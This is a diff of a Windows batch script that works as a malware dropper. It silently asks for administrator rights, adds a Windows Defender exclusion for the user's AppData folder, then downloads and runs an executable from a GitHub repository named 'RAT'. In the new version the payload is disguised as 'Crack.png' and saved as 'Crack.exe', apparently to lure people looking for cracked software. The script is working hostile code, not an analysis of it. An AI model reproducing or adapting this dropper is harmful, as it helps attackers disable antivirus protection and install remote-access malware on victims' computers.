@@ -1,23 +1,15 @@
 @echo off
-:: Relaunch as admin if not elevated
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb runAs"
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
-
-:: Set paths
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
-set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
-
-:: Add Defender exclusion
+set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
-
-:: Download file
-powershell -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::SecurityProtocol = 3072; (New-Object System.Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
-
-:: Run file
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 exit
-
+:: Made by GLICHED 
+:: v2
